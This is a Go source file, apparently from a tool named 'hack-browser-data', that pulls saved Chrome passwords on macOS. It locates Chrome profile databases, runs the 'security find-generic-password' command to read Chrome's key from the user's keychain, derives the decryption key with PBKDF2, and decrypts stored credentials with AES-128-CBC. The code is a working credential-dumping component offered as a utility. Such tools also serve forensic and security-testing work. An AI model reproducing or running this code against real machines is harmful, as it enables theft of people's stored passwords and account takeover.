package utils

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"errors"
	"hack-browser-data/log"
	"os/exec"
	"path/filepath"

	"golang.org/x/crypto/pbkdf2"
)

const (
	macChromeDir = "/Users/*/Library/Application Support/Google/Chrome/*/"
)

var (
	iv         = []byte{32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32}
	command    = []string{"security", "find-generic-password", "-wa", "Chrome"}
	chromeSalt = []byte("saltysalt")
	chromeKey  []byte
	chromePass []byte
)

func GetDBPath(dbName ...string) (dbFile []string) {
	for _, v := range dbName {
		s, err := filepath.Glob(macChromeDir + v)
		if err != nil && len(s) == 0 {
			continue
		}
		if len(s) > 0 {
			log.Debugf("Find %s File Success", v)
			log.Debugf("%s file location is %s", v, s[0])
			dbFile = append(dbFile, s[0])
		}
	}
	return dbFile
}

func InitChromeKey() error {
	var (
		cmd            *exec.Cmd
		stdout, stderr bytes.Buffer
	)
	cmd = exec.Command(command[0], command[1], command[2], command[3])
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		log.Println(err)
		return err
	}
	if stderr.Len() > 0 {
		err = errors.New(stderr.String())
		log.Println(err)
	}
	temp := stdout.Bytes()
	chromePass = temp[:len(temp)-1]
	decryptPass(chromePass)
	return err
}

func decryptPass(chromePass []byte) {
	chromeKey = pbkdf2.Key(chromePass, chromeSalt, 1003, 16, sha1.New)
}

func Aes128CBCDecrypt(encryptPass []byte) (string, error) {
	if len(chromeKey) == 0 {
		return "", nil
	}
	block, err := aes.NewCipher(chromeKey)
	if err != nil {
		return "", err
	}
	dst := make([]byte, len(encryptPass))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(dst, encryptPass)
	dst = PKCS5UnPadding(dst)
	return string(dst), nil
}

func PKCS5UnPadding(src []byte) []byte {
	length := len(src)
	unpadding := int(src[length-1])
	return src[:(length - unpadding)]
}
